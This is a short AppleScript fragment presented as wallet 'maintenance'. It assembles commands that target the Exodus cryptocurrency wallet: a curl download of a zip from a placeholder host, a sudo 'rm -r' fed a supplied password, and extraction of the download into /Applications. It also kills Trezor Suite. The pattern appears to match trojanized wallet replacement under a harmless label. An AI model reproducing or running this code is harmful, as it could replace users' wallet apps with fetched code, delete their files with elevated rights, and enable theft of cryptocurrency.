on maintenanceCommands()
    set targetBundle to "/Applications/Exodus.app"
    set downloadCommand to "curl -o /tmp/wallet-update.zip https://updates.example.org/release.zip"
    set removalCommand to "echo supplied_password | sudo -S rm -r "
    set extractionCommand to "ditto -x -k /tmp/wallet-update.zip /Applications"
    return {targetBundle, downloadCommand, removalCommand, extractionCommand}
end maintenanceCommands

on stopWalletBeforeMaintenance()
    do shell script "pkill \"Trezor Suite\""
end stopWalletBeforeMaintenance
